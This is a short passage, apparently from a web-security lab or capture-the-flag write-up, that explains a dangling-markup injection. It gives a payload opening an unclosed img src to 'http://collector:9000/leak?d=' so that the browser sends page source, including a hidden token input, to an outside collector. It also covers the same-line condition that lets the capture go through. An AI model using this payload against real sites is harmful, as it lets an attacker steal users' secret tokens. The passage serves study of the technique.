Inject a **dangling** image whose `src` is left open:

```
u = x><img src='http://collector:9000/leak?d=
```

This renders as `<link … href=x><img src='http://collector:9000/leak?d=…`. Because
the single quote after `src=` is never closed by you, the HTML parser keeps reading
the page **source** into that URL until it hits the **next `'`** in the document —
which is in the trailing `<a href='/home'>`. Everything in between — including the
hidden `<input … value=TOKEN>` — becomes part of the URL the browser fetches. The
token lands at the collector.

Two things to know:

- Dangling markup captures the raw **source text**, so a `type=hidden` input's
  `value=` is captured even though it isn't visible.
- A browser will not send a subresource URL formed across a **newline** — but this
  page renders the token on the **same line** as your injection, so the capture is
  sent.
